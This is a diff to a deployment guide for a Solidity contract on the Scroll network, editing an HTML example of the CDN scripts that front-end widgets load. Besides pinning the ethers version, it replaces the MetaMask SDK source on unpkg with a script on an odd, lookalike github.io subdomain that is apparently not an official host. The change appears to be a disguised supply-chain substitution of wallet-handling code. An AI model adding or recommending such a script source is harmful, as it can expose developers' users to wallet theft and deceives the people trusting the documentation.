@@ -71,8 +71,8 @@ Follow these steps to deploy and upgrade `SQMU.sol` on the Scroll network.
 All front-end widgets load these libraries directly from public CDNs. Example:
 
 ```html
-<script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
-<script src="https://unpkg.com/@metamask/sdk/dist/browser/index.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
 ```
 
 ## Developer Guidelines
